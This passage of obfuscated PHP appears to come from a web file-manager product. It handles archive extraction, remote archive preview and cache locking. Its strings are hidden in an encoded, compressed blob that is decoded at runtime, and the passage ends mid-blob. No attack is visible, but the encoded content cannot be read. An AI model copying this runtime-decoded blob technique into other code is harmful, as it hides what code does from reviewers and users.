$š¾³Ş‰š = parent::mkdir($š¾³Ş‰š); $ä§½§» = array($¼Á¢ï²[84] => $š¾³Ş‰š); } else { if (isset($ä§½§»[$¼Á¢ï²[411]]) && trim($ä§½§»[$¼Á¢ï²[84]], $¼Á¢ï²[8]) != trim($š¾³Ş‰š, $¼Á¢ï²[8])) { $£ĞËºÊ = KodIO::make($ä§½§»[$¼Á¢ï²[441]]); $ÌöÌ»®Ò = parent::fileNameAuto($£ĞËºÊ, $ä§½§»[$¼Á¢ï²[32]], REPEAT_RENAME_FOLDER, !0); $š¾³Ş‰š = parent::mkdir($£ĞËºÊ . $ÌöÌ»®Ò); $ä§½§» = array($¼Á¢ï²[84] => $š¾³Ş‰š); } } $š¾³Ş‰š = $ä§½§»[$¼Á¢ï²[84]]; $Ñá„²÷¡ = self::tmpFileName($ÓÈœàğÍ); $öÆû—ó‚ = TEMP_FILES . $Ñá„²÷¡; del_dir($öÆû—ó‚); mk_dir($öÆû—ó‚); $º¿ğƒô¢ = self::fileExt($ÓÈœàğÍ); $ ä™ï = $öÆû—ó‚ . $¼Á¢ï²[10] . $º¿ğƒô¢; if (!@file_exists(self::iconvSystem($ ä™ï))) { $œ…üŠ”˜ = self::localFilePath($ß•ÚŞäµ, $º¿ğƒô¢); $ ä™ï = $œ…üŠ”˜ ? $œ…üŠ”˜ : parent::download($ß•ÚŞäµ, $ ä™ï); } $ ä™ï = self::iconvSystem($ ä™ï); $‘ìö“·ò = isset($é¥ı¥¨œ[$¼Á¢ï²[1180]]) ? $é¥ı¥¨œ[$¼Á¢ï²[1180]] : $¼Á¢ï²[1181]; $”’ÙƒÃ“ = KodArchive::extract($ ä™ï, $öÆû—ó‚ . $¼Á¢ï²[8], $‘ìö“·ò); self::archiveExt(); if (!$”’ÙƒÃ“[$¼Á¢ï²[1182]]) { show_json($¼Á¢ï²[1183] . $”’ÙƒÃ“[$¼Á¢ï²[1184]], !1); } Hook::trigger($¼Á¢ï²[1185], $öÆû—ó‚); recursion_dir($öÆû—ó‚, $¨°Ô„Ãß, $İÖ¼ïÊÛ, 0); $ïÈÆ÷Ş = array_merge($¨°Ô„Ãß, $İÖ¼ïÊÛ); foreach ($ïÈÆ÷Ş as $“ÔúÎû) { $“ÔúÎû = self::iconvApp($“ÔúÎû); self::move($“ÔúÎû, $š¾³Ş‰š, $ààæ©ô‰); } del_dir($öÆû—ó‚); if (!$œ…üŠ”˜) { del_file($ ä™ï); } return !0; } public static function unzipList($–×ÇÃğ) { $÷š•Èëä =& $_SERVER[ĞÆÏ¡Îª]; $©’ıÚ = $–×ÇÃğ[$÷š•Èëä[84]]; $ôÏİ†û€ = isset($–×ÇÃğ[$÷š•Èëä[1186]]) ? $–×ÇÃğ[$÷š•Èëä[1186]] : -1; $€¸ñë— = 50000; if (request_url_safe($©’ıÚ)) { $å·›ÇÍä = parse_url_query($©’ıÚ); if (!isset($å·›ÇÍä[$÷š•Èëä[84]])) { show_json($÷š•Èëä[1187], !1); } } $ãòê¶¿³ = isset($å·›ÇÍä) ? $å·›ÇÍä[$÷š•Èëä[84]] : $©’ıÚ; $‹¬¾è†Ş = self::info($ãòê¶¿³); $¯¹®çè˜ = self::fileExt($‹¬¾è†Ş); $È¶¸ğË¨ = self::tmpFileName($‹¬¾è†Ş); if (isset($å·›ÇÍä)) { $ûË“ã’ = array($å·›ÇÍä[$÷š•Èëä[84]], $å·›ÇÍä[$÷š•Èëä[1186]], $å·›ÇÍä[$÷š•Èëä[32]]); $ÏŸªÒÅÂ = md5(implode($÷š•Èëä[11], $ûË“ã’)) . $÷š•Èëä[10] . get_path_ext($å·›ÇÍä[$÷š•Èëä[32]]); } else { $ûË“ã’ = array($‹¬¾è†Ş[$÷š•Èëä[32]], $‹¬¾è†Ş[$÷š•Èëä[84]], $‹¬¾è†Ş[$÷š•Èëä[76]]); $ÏŸªÒÅÂ = md5(implode($÷š•Èëä[11], $ûË“ã’)) . $÷š•Èëä[10] . $¯¹®çè˜; } if ($ôÏİ†û€ == -1) { $ÜŸÏ¬¾Ì = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\145\167\57{$È¶¸ğË¨}\x2f{$ÏŸªÒÅÂ}\x2e\154\x6f\147"; $’©Ø¾¦¹ = self::infoFull($ÜŸÏ¬¾Ì); if ($’©Ø¾¦¹) { $ÜŸÏ¬¾Ì = $’©Ø¾¦¹[$÷š•Èëä[84]]; $â¿©† = self::getContent($ÜŸÏ¬¾Ì); if ($â¿©†) { $¤ËõÕ§á = json_decode($â¿©†, !0); $¤ËõÕ§á = is_array($¤ËõÕ§á) ? $¤ËõÕ§á : array(); if (count($¤ËõÕ§á) >= $€¸ñë—) { show_json(sprintf(LNG($÷š•Èëä[1188]), count($¤ËõÕ§á)), !1); } return $¤ËõÕ§á; } } else { $ÜŸÏ¬¾Ì = self::mkfile($ÜŸÏ¬¾Ì); } } $­µúœªƒ = TEMP_FILES . $È¶¸ğË¨; if (!is_dir($­µúœªƒ)) { mk_dir($­µúœªƒ); } $û×İñ½ğ = $­µúœªƒ . $÷š•Èëä[8] . $ÏŸªÒÅÂ; if (!@file_exists(self::iconvSystem($û×İñ½ğ))) { if (isset($å·›ÇÍä)) { url_request($©’ıÚ, $÷š•Èëä[1189], $û×İñ½ğ); } else { $¨ì–ŒÊ° = self::localFilePath($©’ıÚ, $¯¹®çè˜); $û×İñ½ğ = $¨ì–ŒÊ° ? $¨ì–ŒÊ° : self::download($©’ıÚ, $û×İñ½ğ); } } $û×İñ½ğ = self::iconvSystem($û×İñ½ğ); if ($ôÏİ†û€ >= 0) { $ğõ¥²âó = isset($–×ÇÃğ[$÷š•Èëä[1190]]) ? $–×ÇÃğ[$÷š•Èëä[1190]] : !1; $‡®Š¨ûµ = isset($–×ÇÃğ[$÷š•Èëä[32]]) ? $–×ÇÃğ[$÷š•Èëä[32]] : $÷š•Èëä[12]; KodArchive::filePreview($û×İñ½ğ, $ôÏİ†û€, $ğõ¥²âó, $‡®Š¨ûµ); self::archiveExt(); die; } $ÛàáÂ™¿ = KodArchive::listContent($û×İñ½ğ); self::archiveExt(); del_dir($­µúœªƒ); if (!$ÛàáÂ™¿[$÷š•Èëä[1182]]) { show_json($ÛàáÂ™¿[$÷š•Èëä[1184]], !1); } $¤ËõÕ§á = json_encode($ÛàáÂ™¿[$÷š•Èëä[1184]]); self::setContent($ÜŸÏ¬¾Ì, $¤ËõÕ§á); if (count($ÛàáÂ™¿[$÷š•Èëä[1184]]) >= $€¸ñë—) { show_json(sprintf(LNG($÷š•Èëä[1188]), count($ÛàáÂ™¿[$÷š•Èëä[1184]])), !1); } return $ÛàáÂ™¿[$÷š•Èëä[1184]]; } private static function fileExt($¿§‹Š–ˆ) { $¿—¾Ô˜ =& $_SERVER[ĞÆÏ¡Îª]; $‰ËÈÖ = $¿§‹Š–ˆ[$¿—¾Ô˜[174]]; if ($‰ËÈÖ == $¿—¾Ô˜[1191]) { $÷Í‡ÛĞš = $¿—¾Ô˜[1192]; if (substr($¿§‹Š–ˆ[$¿—¾Ô˜[32]], -strlen($÷Í‡ÛĞš)) == $÷Í‡ÛĞš) { $‰ËÈÖ = $¿—¾Ô˜[1193]; } } self::archiveExt($‰ËÈÖ); return $‰ËÈÖ; } private static function zipFileList($ŒÙï¹Ÿ¼, $êüòšƒ× = false) { $âŠ£Ï” =& $_SERVER[ĞÆÏ¡Îª]; $­•äÈÛì = array(); foreach ($ŒÙï¹Ÿ¼ as $•›ÄË•ú) { $“„ÕÓˆÈ = $•›ÄË•ú[$âŠ£Ï”[84]]; if ($êüòšƒ×) { $“„ÕÓˆÈ = self::copy($•›ÄË•ú[$âŠ£Ï”[84]], $êüòšƒ×, $âŠ£Ï”[813]); } else { $¢£¢‰º = self::init($•›ÄË•ú[$âŠ£Ï”[84]]); if ($¢£¢‰º->getType() == $âŠ£Ï”[106]) { $“„ÕÓˆÈ = $¢£¢‰º->path; } } if ($“„ÕÓˆÈ && self::local()->exist($“„ÕÓˆÈ)) { $­•äÈÛì[$•›ÄË•ú[$âŠ£Ï”[84]]] = $“„ÕÓˆÈ; } } if (!empty($­•äÈÛì)) { return array_values($­•äÈÛì); } show_json(LNG($âŠ£Ï”[1157]), !1); } public static function tmpFileName($·ÌÇ¸š†) { $‹äÆ­¤³ =& $_SERVER[ĞÆÏ¡Îª]; $ïú ß• = array($·ÌÇ¸š†[$‹äÆ­¤³[32]], $·ÌÇ¸š†[$‹äÆ­¤³[84]], $·ÌÇ¸š†[$‹äÆ­¤³[76]], $·ÌÇ¸š†[$‹äÆ­¤³[530]]); return md5(implode($‹äÆ­¤³[11], $ïú ß•)); } private static function localFilePath($ıñÓ®Òå, $¡°¡­‘ö) { $ ÍÒÛÁ =& $_SERVER[ĞÆÏ¡Îª]; if ($¡°¡­‘ö == $ ÍÒÛÁ[1194] && strtoupper(substr(PHP_OS, 0, 3)) == $ ÍÒÛÁ[1195]) { return !1; } $“¹àæİÛ = KodIO::parse($ıñÓ®Òå); if ($“¹àæİÛ[$ ÍÒÛÁ[33]] == KodIO::KOD_SOURCE) { $ç‘ˆİÉŠ = Model($ ÍÒÛÁ[820])->fileInfoGet(KodIO::sourceID($ıñÓ®Òå)); if (!$ç‘ˆİÉŠ[$ ÍÒÛÁ[84]]) { show_json($ ÍÒÛÁ[1196], !1); } $ıñÓ®Òå = $ç‘ˆİÉŠ[$ ÍÒÛÁ[84]]; } $Öåó²¸ä = self::init($ıñÓ®Òå); if ($Öåó²¸ä->pathParse[$ ÍÒÛÁ[1142]]) { $ıñÓ®Òå = $Öåó²¸ä->pathParse[$ ÍÒÛÁ[1142]]; $Öåó²¸ä = self::init($ıñÓ®Òå); } $‚âŞ–Î = $Öåó²¸ä->getType(); if ($‚âŞ–Î == $ ÍÒÛÁ[106] || $‚âŞ–Î == $ ÍÒÛÁ[1197]) { if (!$Öåó²¸ä->exist($Öåó²¸ä->path)) { show_json(LNG($ ÍÒÛÁ[105]), !1); } return $Öåó²¸ä->path; } return !1; } private static function archiveExt($à»Ûœó = '') { $GLOBALS[$_SERVER[ĞÆÏ¡Îª][1198]] = $à»Ûœó; } } goto då²Å–¸¦; f²­àØãÍ: class CacheLockRedis { public function lock($Œ½¯áƒ², $ùŒ÷‘¾ = 10) { $÷ÄšñŠï = Cache::init(); $‰Õ„Ğğœ = microtime(!0) + $ùŒ÷‘¾; while (microtime(!0) < $‰Õ„Ğğœ) { $´±‡Ø…ò = $÷ÄšñŠï->get($Œ½¯áƒ²); if (!$´±‡Ø…ò) { $–»˜¼è = $÷ÄšñŠï->setLock($Œ½¯áƒ², $‰Õ„Ğğœ, $ùŒ÷‘¾); if ($–»˜¼è) { return !0; } } else { if ($´±‡Ø…ò < microtime(!0)) { $÷ÄšñŠï->set($Œ½¯áƒ², $‰Õ„Ğğœ, $ùŒ÷‘¾ * 2); if ($÷ÄšñŠï->get($Œ½¯áƒ²) === $´±‡Ø…ò) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Äæ‹Í¶Æ) { return Cache::init()->get($Äæ‹Í¶Æ); } public function unlock($±ÙœÇ±») { return Cache::init()->remove($±ÙœÇ±»); } } class CacheLockMemcached { public function lock($çÔòßöº, $Šëİ–ïï = 0) { $ŞÑ­òÒ‘ = Cache::init(); $İÅãæıú = microtime(!0) + $Šëİ–ïï; while (microtime(!0) < $İÅãæıú) { $»êˆúú = $ŞÑ­òÒ‘->get($çÔòßöº); if (!$»êˆúú || $»êˆúú < microtime(!0)) { $Œ–ì±½ = $ŞÑ­òÒ‘->handle->add($çÔòßöº, $İÅãæıú, $Šëİ–ïï); if ($Œ–ì±½) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($üÙñ™šã) { return Cache::init()->get($üÙñ™šã); } public function unlock($¡Û—©®Â) { return Cache::init()->remove($¡Û—©®Â); } } class CacheLockDatabase { public function lock($ÓèÛ¨¤Ü, $ö¿ïàÌ³ = 0) { $÷àêı“å = Model($_SERVER[ĞÆÏ¡Îª][824]); $ë¤æÁ³Ù = microtime(!0) + $ö¿ïàÌ³; while (microtime(!0) < $ë¤æÁ³Ù) { $©ãû™†¼ = $÷àêı“å->get($ÓèÛ¨¤Ü); if (!$©ãû™†¼ || $©ãû™†¼ < microtime(!0)) { $»ÙÜƒ·‘ = $÷àêı“å->set($ÓèÛ¨¤Ü, $ë¤æÁ³Ù); if ($»ÙÜƒ·‘) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($§ìıæÔû) { return Model($_SERVER[ĞÆÏ¡Îª][824])->get($§ìıæÔû); } public function unlock($é»¾ãÂ´) { Model($_SERVER[ĞÆÏ¡Îª][824])->remove($é»¾ãÂ´); } } goto A³éÆ‰å—Š; dÌÇò¹ƒ¦ƒ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('0MbPoc6q'), "\xd4\x97\xf1\xbe\xd9\xfc"); $_SERVER[ĞÆÏ¡Îª] = explode("\174\3\174\2\174\5", gzinflate(substr(strrev('£lrHä²"Û-²$âqììZ\'l`Â…Ò…Ğ	l!(ÕÕx	}Å'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹')."\214\245\221\65\261\244\221\147\106\336\222\120\166\32\40\241\354\120\150\241\354\113\111\330\103\201\260\103\37\73\177\133\40\245\145\55\111\240\204\2\375\201\266\224\345\335\345\334"."\145\106\62\374\357\173\357\373\136\76\260\346\356\333\271\347\236\163\356\71\347\176\372\371\215\367\237\174\331\272\211\353\366\134\267\367\171\67\136\377\324\73\347\323\357\165\23\320"."\xdf\x7d\xe8\xf7\x51\x67\xef\xb7\x7\xf9\xf7\xbd\xb3\xcf\xaa\xa9\x69\x9f\x33\x79\x7a\xe4\x80\x73\xef\xba\x55\xfd\x8d\x7a\xb3\x7a\x76\x34\xfc\xcc\xb3\xa1\x3\x9f\xff\xcd\x71\xc1\x9d\xd7\x3c\x33"."\272\163\302\36\357\357\275\345\7\15\50\63\55\333\100\177\224\202\141\53\332\210\156\331\26\215\110\31\205\214\336\117\277\365\2\375\365\323\237\256\130\330\324\362\206\255\321\240"."\217\376\44\241\137\344\257\65\230\323\131\172\62\22\115\44\343\135\235\235\301\130\2\62\65\310\351\171\43\15\137\105\325\124\363\320\176\121\63\55\324\33\271\272\144\321\50\152".strrev('ï&Ãñ¯=	Új¶ã>D4£™¤°r_G!uV&J®Ø%²SKSPZ§Ú¶«HˆŒG')."\x57\x53\xb0\x2d\x14\x51\x12\xb1\x40\x24\x1e\x68\x4e\x84\xa2\x11\x1a\xdd\x1c\xed\xe8\x8\x25\xca\xe3\x63\xd1\x70\xb8\x29\xd0\xbc\xb4\x3c\xa5\x33\x16\x68\xeb\x8\x28\xa8\x7f\x39\x2d\xa9\x17\x32".base64_decode('Ro2ymqasVmrpR6uu5dL0s6Cy7tijRfhK8C+0TIVSLkcDEf6V1jJqKQez1SIHiqae')."\127\331\240\227\152\243\74\226\176\250\45\333\320\13\51\32\10\216\330\246\52\342\121\137\123\150\241\265\2\124\25\17\206\203\315\11\5\167\120\151\215\105\73\24\130\204\274\152"."\331\232\251\254\150\17\306\202\12\356\164\143\65\31\153\265\2\360\22\101\123\241\4\302\141\145\274\32\154\55\137\144\325\320\62\25\52\213\306\132\202\61\245\151\225\42\146\50".base64_decode('ZeTzRsGHakEraUtdDcZi9MMD4B0O4UWDQLS1NR7kIRjcsjDqyUyAT0concnZySE1').base64_decode('V2JgOkB/q+EHfg0LQHdQL+glAFOowjD4toKPEsutsRgtDR95VN6AnYe24RD9bFxE')."\177\27\100\246\276\44\116\323\114\73\251\25\122\106\132\57\300\146\135\14\100\247\332\331\26\123\107\31\150\70\143\344\322\354\333\322\307\140\50\31\75\247\105\112\171\71\13\17".base64_decode('prJ6Lm2y/fVNOWkwzLcrzitCRdQTvtP1zKjYb5ZRMlNaCO0IUa6T566HTJpto8HB')."\334\350\106\127\61\147\250\351\270\146\362\241\351\106\53\52\30\55\331\162\144\211\144\153\65\314\174\13\302\14\320\76\332\25\172\127\205\204\1\266\57\322\322\214\371\153\272\117".strrev('¤“³Ò;ej¬É¢†'."\r".'Qø/O«~6-³Óäã`ÑR\\¹jÊ}×Ô©ı½ÛÕ~ö')."\303\250\151\155\304\127\314\26\141\127\363\215\334\343\0\154\74\165\21\303\16\112\170\71\147\244\324\234\74\104\372\235\265\355\142\134\53\244\361\114\300\120\214\341\2\231\251\242"."\246\101\246\26\217\222\126\72\224\125\112\173\203\336\140\261\202\371\34\377\142\243\343\161\26\217\264\107\330\162\246\63\364\243\217\35\13\125\320\240\156\21\14\47\266\247\132\54"."\346\364\224\152\353\106\301\157\244\154\315\366\132\266\251\251\120\143\40\225\322\54\313\333\154\24\154\323\310\171\3\271\234\61\354\215\232\172\277\136\150\120\246\1\262\105\211\150"."\x53\x7b\x31\x2\x6c\x80\x9d\x5a\xb5\x40\xc1\x80\x82\x9b\x99\xd6\x58\xb2\x33\xde\x79\x6c\x7\xf2\xdc\xa6\x5a\xb0\x32\x9a\xe9\xd\xc2\xce\x68\x50\x50\x67\x39\x16\x64\xd9\x5a\x74\xab\x68\x58\x3a".base64_decode('7l6Dotq2mspiDCKqb/yG/Hohpxe0srzBkaJuahbrq9LWkYBKUO2at9NU+/Nqg1Is')."\365\241\231\201\235\132\41\216\346\206\251\151\120\122\70\350\121\362\45\313\366\232\32\102\105\72\72\356\140\222\103\31\157\7\336\127\272\226\366\306\21\306\206\350\231\165\263\24"."\4\72\12\113\243\261\355\211\104\147\62\324\212\216\344\110\60\331\21\110\64\267\103\267\155\265\237\365\71\214\360\60\257\222\105\256\364\242\375\205\201\53\202\306\52\42\73\215".strrev(';~…k‰ÎıCZ­¨ßOÏ¡jc{h»—ŒË'."\r".'9œ$±ñÏºF(67'."\r".'DÍa')."\xcb\xa\xc6\x83\xb1\xe5\xc1\x58\x32\x1e\x6d\x4d\xac\x8\xc4\xe0\x30\x2f\x20\x28\x19\x61\x4d\xe1\xaa\x73\xde\x98\x96\x46\x53\x9f\xb2\x59\x39\xb5\x88\x67\x8d\xe5\xc1\x9b\x3\xaf\x15\x4b\xc5\x1b".base64_decode('hqWFQ214Ylq8FsrklXOxusN6Xsd9t3kKmUl00rdBh/xkQI092Wk1PenptV70d1pt')."\x77\x4f\x8b\x6f\x5a\xef\x62\xbf\x2e\xca\xf8\xeb\x7d\xf5\xca\x8c\xba\x39\x4a\x27\x22\x3d\x74\x35\xa7\xc0\xa0\xcb\x72\xd4\x29\xd1\xa5\xce\x69\x11\xd0\x5c\x30\xa\xda\x37\x4c\xe\x3e\xbb\xa4\x6d".base64_decode('75pWGhkLLusKxhPJjmCiPdoCrQcD8BU26LZlo+2mP72wur30J6lbrdKxgoMc/SSN').base64_decode('vjVoMTo0hmMzFEeH8mq/C+XjUIdhas4YcVSt0NPsTMDBdk3vz8J86bi2lJEzTDWH').base64_decode('MSPbFBrDVv06YCtAwiIQ1/NF1lk7W8r3SZ+A7S0EPwyXZQ1+nhkmfDX4IePUGa0M')."\xdb\xfb\xe3\x33\xd1\x7f\x2\xb5\xa7\x8d\xbc\xca\x10\x25\x41\x71\x5a\x9a\xe2\x38\x1a\x35\xcd\x91\xd2\xae\xa9\xe2\x90\xb6\x4d\xdb\xc0\xb1\xa6\x23\xb\x9a\xd0\xac\x1\xb\xdb\xaf\xb1\x2e\x95\x78"."\337\130\57\323\132\116\143\263\221\325\330\61\121\7\331\320\61\307\347\52\303\327\14\121\173\50\126\234\317\272\25\103\45\61\122\147\341\25\230\74\26\21\66\317\232\103\47\124".base64_decode('lKy4CHeaWkaHTVpAK9KhmgNsNGgFBKzggARHrV3hcLI5GkkgkprGrIiFEkEGt4GW')."\144\240\271\223\37\274\142\105\41\3\106\60\345\247\7\215\31\232\1\35\107\335\361\213\143\16\141\354\242\121\260\64\157\12\112\10\322\273\54\51\55\116\1\300\63\342\344\160".strrev('.Î±¡3O¬"Ç°(q£;ü;\\Diã¹J°CÊ>BJÁuåà-£Íæ?5^#')."\110\312\113\20\322\26\204\310\311\354\74\127\201\254\12\254\210\63\304\134\102\371\115\175\114\25\103\132\314\372\303\6\222\317\11\172\316\71\52\257\230\371\244\232\1\234\37\52".base64_decode('yDECzJIIYpMwkTCkpkA81JzsDCTaOc3gt9IDll81EQE6hOjIPj8mqDB/5+MkxywA')."\330\254\226\32\110\252\175\150\107\62\144\127\302\347\62\20\350\364\157\242\75\24\131\232\354\210\266\4\303\311\120\4\41\314\104\171\174\127\147\113\200\101\230\34\337\24\145\375".strrev('t	È»s@æÉâ[†'."\n".'Ø<•¡­‚ÆvŸÄ®‚ºâ„˜¯<PÊàöw!Â—2„.Ø‚')."\x40\x20\x99\xc1\x1c\xa2\xe5\x77\xe6\x4f\x22\xdc\x1f\xe7\x7c\x66\x72\x8\xf3\xcc\x6\x9f\x7b\x99\xb5\x4b\x32\xa6\x25\x29\x40\x1b\x9d\xf1\x1a\x6c\x0\x18\x2e\xe6\xd4\xc9\x48\x80\x4f\x4f\x19\x25".base64_decode('djJx+jbP1iCvwt5W2fldQ39qlUBcsYtJjqT6RvknGQYLI0oW2lfgHCrrQRLnadIy').base64_decode('/HioHBHI2PwUcoUR3Ik0tAIBIhJAkEBWBJrR0Q437QDrTkaw48loZzAWwMx8ckUs')."\32\151\203\2\303\131\215\165\40\4\323\137\303\150\76\340\351\155\201\47\21\301\246\62\346\116\114\372\32\203\115\345\72\372\163\54\375\101\120\16\215\153\5\66\353\175\370\310"."\140\207\36\373\310\240\115\312\320\275\121\342\255\365\31\106\216\241\17\104\266\160\74\306\145\2\153\54\6\44\43\14\3\116\207\6\107\340\330\112\104\227\6\43\111\6\131\64"."\44\101\43\215\100\134\166\64\6\23\142\33\3\214\125\244\211\261\140\234\41\37\123\33\54\351\154\272\374\276\351\0\305\32\72\31\241\171\377\11\75\303\323\153\272\275\323\175"."\xbd\xe8\xa3\x76\xda\x12\x1a\x84\x50\x8f\xcf\x11\x9c\x2\xe5\x4b\x26\x2f\x8d\xa9\xb9\x1a\x6b\x71\x6d\x43\x8f\xbf\xc7\x5f\xb3\xb8\xa1\x3b\xe0\x1d\x53\xbd\x63\x75\xde\xf9\xde\xde\xe9\x3d\xbe\xda".strrev('T¬ÅÚ´ïpÏLwÇº?L7Vô÷t—«‰ì{Çµ<Yìiú/L|\\eœzÖg†v»Ñé')."\xc9\x44\x6c\x70\x6a\x94\x77\x35\x3d\xbd\x6\x75\x9\x51\x79\x3c\x4b\x81\x60\x62\x29\x3\x4b\x18\xd3\x8b\x22\x76\xed\x9c\xf5\x2c\x1e\xad\xa1\xd6\x2f\x4a\x74\x7b\x7b\xa6\xf7\x2e\x96\xca\x49\x51".base64_decode('7rYQFYeOhSzPF/Aej0fGi+J9D/BRKqQEUsf7ok9NAR7Q+wt8CyFSg4sPnMzF2qn0')."\167\75\133\310\176\155\204\241\206\102\106\67\363\14\351\352\203\114\72\122\320\6\341\303\260\31\174\367\151\366\260\306\300\3\305\73\302\10\70\30\107\213\222\244\120\216\320\253"."\320\2\346\363\70\214\162\140\322\213\111\114\370\15\363\120\132\53\300\72\115\202\334\126\112\55\152\161\151\204\311\144\42\320\24\16\46\31\206\1\114\314\302\4\53\66\161\111"."\x22\x1a\x9a\xc0\xa8\xc\x3f\xa4\x4\x67\x41\x98\x28\xd8\xf9\xd6\x60\x4e\x21\x88\x41\xd1\x4c\xd3\x30\x1b\x88\x50\xd5\x2a\x15\x31\xc5\x88\x18\x46\x1b\xcd\xad\x32\xa0\x8d\x2a\x8d\x8b\x14\x3a\xe5"."\120\56\51\57\100\121\145\344\13\26\2\150\142\323\143\14\5\175\52\212\25\262\20\235\307\210\56\177\115\117\117\251\133\113\367\166\43\300\127\275\231\336\265\63\327\327\62\346"."\303\337\203\376\261\100\240\202\170\57\311\261\141\22\221\15\76\334\17\56\341\161\4\170\62\15\32\46\247\334\212\16\332\336\66\154\65\347\250\42\201\143\30\152\142\364\4\310"."\x3a\xe8\x6a\x87\x5\xc6\xc2\x14\x86\x24\x17\x25\xe8\x34\xc2\x65\xb\x5c\x64\x23\x9\xe6\x70\x89\xb8\x66\xfb\x78\xe\x8f\x94\x98\x44\x61\x18\x5f\x63\x15\x43\xf3\x5\xb4\x91\x9a\xa5\x43\x8e\xca"."\232\342\243\226\255\345\35\142\124\113\303\364\110\153\51\227\263\71\157\221\323\7\240\156\330\45\40\325\365\302\71\60\275\122\321\126\303\144\54\372\64\350\106\325\264\112\31\103"."\205\2\142\250\145\40\23\307\153\133\0\21\62\11\245\206\111\40\225\120\104\151\212\106\303\301\100\104\301\47\71\234\100\210\114\210\7\73\3\350\370\302\314\176\74\21\4\241"."\150\250\305\313\352\135\351\15\1\313\307\77\164\166\362\161\162\16\326\271\210\161\111\22\315\121\22\261\132\3\154\125\21\152\264\131\121\20\350\101\10\123\302\36\54\302\362\140".strrev('bI'."\0".'Ò8BÕº<Z†|<TÀtˆš­˜€Üàù0Úéô!°G›üÁäÆƒÃš').base64_decode('srNYUJNTRz20c2FtSMt5WNc8rMcexrx6CMfZAt3qQtsMukU+ETbNejBgYbj2CIml')."\xc7\x18\x2e\x68\x26\xc9\x2\xd3\x26\x98\x23\x8f\x60\x9c\x3c\xfd\xa6\x51\x2a\x76\xb2\x36\xa5\x10\xed\x16\x44\x88\x3e\xf3\x88\x98\x61\xd8\x1e\xc6\xc\x7b\x64\x3e\x19\x7a\x11\x60\xfb\xa7\xe2\x74".base64_decode('Vh4NmX93J2DtcFL5LH3LYpWvh1MmsJbWCEKH9ez0c+QRy8u2ZU4TIbwA4mu52NB4')."\100\255\352\220\14\171\225\240\220\235\101\14\254\205\170\122\10\246\5\115\354\146\201\335\42\153\334\150\102\355\217\113\315\331\152\77\153\13\43\65\224\72\156\126\372\35\323\122"."\xa3\x29\xc1\x53\xb7\x48\x9c\xba\x33\xe4\xdc\x5c\x25\x54\x5f\x5c\xcd\xb8\x6\xe9\x21\xbb\xac\xd2\xe\xa9\xc\x1\x1c\xea\xf9\x82\x4d\x9e\x34\x89\xcd\x38\xdb\xa\x7c\xf5\x1d\x3b\xe8\xdb\xf7\x2e".base64_decode('jJKgz2hRkB60sxh5x9FR2JpjUzRDTga07XGG8NbzETRO7n3iXPgSDrYmlOOiCPPp')."\106\222\226\111\342\314\12\371\143\24\24\107\335\154\272\224\106\222\56\302\152\41\115\143\126\243\363\141\165\143\25\153\244\312\121\134\0\215\263\23\36\26\124\312\301\20\117\267".strrev('Àn'."\n".'0ìPqv_¬2¥­,N,i|>9a¹ÀZ¨½-â¢¢Æ™ÅğÈ8	<')."\43\121\70\30\341\170\305\136\221\202\316\51\167\101\244\353\340\305\123\324\251\27\106\365\202\54\162\23\261\342\354\26\244\3\336\352\56\41\141\313\170\337\364\210\21\42\75\17".base64_decode('iPo8WBAgHe5C3oR6T6QReYdwsrznDOnCoLviwViStQ27GyA+q5piMhlOwohBCDJx')."\26\21\224\262\145\324\41\101\326\70\312\110\230\305\262\107\131\357\345\117\147\245\64\330\62\136\240\235\113\152\52\5\145\74\245\133\141\56\104\161\176\223\221\46\214\212\101\54"."\15\144\337\224\130\340\227\236\150\21\152\30\122\1\342\44\51\11\27\70\122\162\142\74\332\245\0\77\0\320\261\212\16\105\372\215\270\200\34\72\13\115\37\336\103\155\370\104".strrev('r½Á…;Ë\'‡w¢ı*ÍûùŠb×6 áğ»È[œšYx¶¢r†Ğ×A\'“')."\270\325\64\70\375\314\211\4\167\246\146\302\240\362\353\126\327\301\56\115\216\203\30\51\213\222\312\270\311\22\127\254\53\50\126\305\161\52\321\50\46\43\127\323\171\275\340\63"."\351\331\347\103\154\7\134\221\173\352\44\312\115\40\245\265\26\71\105\340\254\134\357\132\164\333\60\20\57\153\372\114\324\262\350\220\204\20\1\233\220\33\124\174\150\312\364\6"."\257\305\102\11\22\152\167\222\125\254\144\274\250\262\155\1\234\112\211\67\303\151\100\300\151\172\152\100\154\145\165\110\105\300\10\125\223\301\210\236\322\160\230\223\321\30\323\4"."\323\272\215\143\360\101\152\60\201\276\310\50\135\233\363\70\31\301\223\163\252\154\361\5\217\342\231\352\310\351\244\64\40\162\32\41\0\174\202\60\222\265\6\122\106\21\340\100".base64_decode('UpLJG0OaFOmzbKMoUqQgTZaSRKVSLr40pB9oi6UJUS0miuSFsoRTp7vYhzkSn4zL').strrev('YjYVywòq·e:j|Š>ÃpªĞÀ¨HpyZ4•sÛ8Àc'."\n".'9H¡Dß–ÀÉ¦')."\271\42\242\217\304\253\222\102\225\263\7\162\71\241\303\340\16\217\133\204\156\166\271\220\34\63\156\261\126\302\54\63\61\173\245\70\316\10\311\233\315\111\314\13\315\23\67\321".base64_decode('78Tb4xM44yA5saCVw4gmaM7qBc3iR7tpVcJZ/58p6fI1wHtlPMDBaZKkGyvlDTnO')."\x71\x2e\xce\x15\x28\x4b\x22\x55\xc8\xb1\x9f\xb4\x1d\x44\x56\x8c\xd4\x21\x6d\x1e\x7\x3c\xa0\xcd\x4a\xc7\x8c\x8f\xa5\x50\x14\x6d\xc6\xca\x10\xea\xce\xa7\x31\x81\x36\xc1\x73\x23\xfc\x68\x95\xb"."\xe1\x24\xbc\x5e\xe3\x55\xca\xd3\x79\x65\x82\xa0\x93\xf3\x21\xc8\xc4\x9\xe3\x55\xc3\x92\x79\x2d\xff\x39\x63\xf7\xcd\xa7\xbe\x48\xbf\x3f\xd8\xf9\xf4\xa6\x6d\x2f\xc0\x6c\xa6\x33\xa3\x23\x3a\xa